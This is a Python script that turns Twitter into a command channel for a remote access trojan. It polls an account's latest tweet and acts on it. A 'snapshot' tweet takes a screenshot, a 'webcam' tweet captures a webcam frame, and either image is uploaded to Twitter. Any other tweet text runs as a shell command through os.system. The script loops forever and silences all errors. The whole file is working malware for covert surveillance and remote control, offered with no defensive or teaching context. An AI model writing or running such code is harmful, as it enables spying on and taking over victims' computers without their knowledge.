#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import csv
import re
import os

import tweepy
import time
import random
import datetime
import pyautogui
import cv2


consumer_key = consumer_key
consumer_secret = CONSUMER_SECRET_KEY
access_key = ACCESS_KEY
access_secret = ACCESS_SECRET_KEY
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_key, access_secret)
api = tweepy.API(auth)

updated_status= False
def get_tweets(username):
    try:
        global updated_status


        number_of_tweets = 1


        for tweet in tweepy.Cursor(api.user_timeline, screen_name = username).items(number_of_tweets):
            if (updated_status == False) :
                tweet_status = "Device woke at " + str(datetime.datetime.now())
                status = api.update_status(status=tweet_status)

                updated_status = True

            tweet = str(tweet)
 
            tweetdata = re.search("'text': '(.*)', 'truncated'", tweet)
            tweetdata = tweetdata.group(1)
              

            if (tweetdata.find("snapshot") != -1 and tweetdata.find("READY FOR NEXT COMMAND") == -1):
            
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save('screenshot.png')
                tweet_status = "SNAPSHOT Taken at " + str(datetime.datetime.now())
                media = api.media_upload("screenshot.png")
                post_result = api.update_status(status=tweet_status, media_ids=[media.media_id])
                tweet_text= " SUCESSFULLY Posted snapshot at " + str(datetime.datetime.now())+ "\nREADY FOR NEXT COMMAND"
                status = api.update_status(status=tweet_text)
                #os.remove('screenshot.png')
                                                          
            elif (tweetdata.find("webcam") != -1 and tweetdata.find("READY FOR NEXT COMMAND") == -1):
                videoCaptureObject = cv2.VideoCapture(0)
                result = True
                while(result):
                    ret,frame = videoCaptureObject.read()
                    cv2.imwrite("Web.jpg",frame)
                    result = False
                videoCaptureObject.release()
                cv2.destroyAllWindows()
                
                tweet_text = "WEBCAM shot Taken at " + str(datetime.datetime.now())
                media = api.media_upload("Web.jpg")
                post_result = api.update_status(status=tweet_text, media_ids=[media.media_id])
                tweet_text= " SUCESSFULLY Posted webcomshot at " + str(datetime.datetime.now())+ "\nREADY FOR NEXT COMMAND"
                status = api.update_status(status=tweet_text)
                #os.remove('Web.jpg')

            elif (tweetdata.find("READY FOR NEXT COMMAND") == -1):
                
                os.system(tweetdata)
                try:
                    tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND"
                    status = api.update_status(status=tweet_status)
                except:
                    tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND " + str(random.randint(1,99999))
                    status = api.update_status(status=tweet_status) 

            else:
                time.sleep(10)
    except:
        pass
    


while(1):
    get_tweets(USER_ID)

